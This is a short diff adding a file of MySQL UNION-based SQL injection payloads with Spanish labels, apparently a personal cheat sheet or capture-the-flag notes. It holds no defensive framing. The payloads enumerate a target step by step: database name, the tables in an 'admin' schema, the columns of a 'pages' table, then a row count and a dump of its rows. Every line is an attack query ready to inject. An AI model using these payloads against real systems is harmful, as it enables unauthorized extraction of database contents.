@@ -1,0 +1,19 @@
+mysql 
+
+-- database name
+
+UNION ALL SELECT CONCAT(IFNULL(CAST(DATABASE() AS CHAR),0x20)," fasd") 
+
+UNION ALL SELECT CONCAT(IFNULL(CAST(COUNT(table_name) AS CHAR),0x20)," numero de tablas") FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN ('admin') 
+
+UNION ALL SELECT CONCAT(IFNULL(CAST(table_name AS CHAR),0x20)," nombre tabla") FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN ('admin') 
+
+UNION ALL SELECT CONCAT(IFNULL(CAST(count(*) AS CHAR),0x20),' numero de columnas') FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='pages' AND table_schema='admin'
+
+UNION ALL SELECT (SELECT CONCAT(IFNULL(CAST(column_name AS CHAR),0x20)," ",IFNULL(CAST(column_type AS CHAR),0x20)," columnas") FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='pages' AND table_schema='admin' LIMIT 0,1)
+
+//id, pagename, pagedata
+UNION ALL SELECT CONCAT(IFNULL(CAST(count(*) AS CHAR),0x20),' numero de filas') from pages
+
+
+UNION ALL Select (SELECT CONCAT(IFNULL(CAST(id AS CHAR),0x20),' ',IFNULL(CAST(pagename AS CHAR),0x20),' ',IFNULL(CAST(pagedata AS CHAR),0x20)) from pages LIMIT 0,1)
